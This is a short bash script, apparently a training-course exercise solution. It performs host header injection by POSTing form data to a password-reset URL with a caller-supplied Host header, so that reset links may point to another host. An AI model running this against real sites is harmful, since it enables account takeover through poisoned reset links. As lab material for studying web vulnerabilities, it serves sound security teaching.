#!/usr/bin/env bash
# Usage: ./1-host_header_injection.sh NEW_HOST TARGET_URL FORM_DATA
# Example: ./1-host_header_injection.sh new_host http://web0x00.hbtn/reset_password email=test@test.hbtn

if [ "$#" -ne 3 ]; then
  echo "Usage: $0 NEW_HOST TARGET_URL FORM_DATA"
  exit 1
fi

NEW_HOST="$1"
TARGET_URL="$2"
FORM_DATA="$3"

# POST request with injected Host header (form data is expected urlencoded, e.g. email=test@test.hbtn)
curl -s -X POST "$TARGET_URL" \
  -H "Host: $NEW_HOST" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "$FORM_DATA"
